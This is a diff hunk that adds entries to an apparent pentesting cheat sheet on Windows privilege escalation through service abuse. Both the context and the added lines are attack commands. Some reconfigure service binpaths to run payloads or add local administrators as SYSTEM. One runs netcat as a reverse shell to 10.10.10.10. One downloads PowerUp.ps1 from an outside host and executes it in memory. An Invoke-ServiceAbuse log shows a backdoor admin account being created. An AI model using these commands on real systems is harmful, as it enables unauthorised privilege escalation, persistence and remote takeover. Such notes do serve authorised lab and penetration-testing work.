@@ -300,6 +300,32 @@ sc config <Service_Name> binpath= "net localgroup administrators username /add"
 sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
 
 sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
+
+sc config SNMPTRAP binpath= "C:\windows\tasks\pi.exe" start= "demand" obj= "NT AUTHORITY\SYSTEM" password= ""
+sc start SNMPTRAP
+
+sc config SNMPTRAP binpath= "cmd.exe /c net localgroup Administrators final\nina /add" start= "demand" obj= "NT AUTHORITY\SYSTEM" password= ""
+sc start SNMPTRAP
+
+# If you get a new session as a different user
+Invoke-WebRequest http://192.168.45.240/PowerUp.ps1 -UseBasicParsing | IEX
+
+PS C:\Windows\tasks> Invoke-ServiceAbuse -ServiceName 'SNMPTRAP'
+
+ServiceAbused Command
+------------- -------
+SNMPTRAP      net user john Password123! /add && net localgroup Administrators john /add
+
+
+PS C:\Windows\tasks> net user
+net user
+
+User accounts for \\JUMP03
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest
+john                     WDAGUtilityAccount
+The command completed successfully.
 ```
 
 ### Restart service
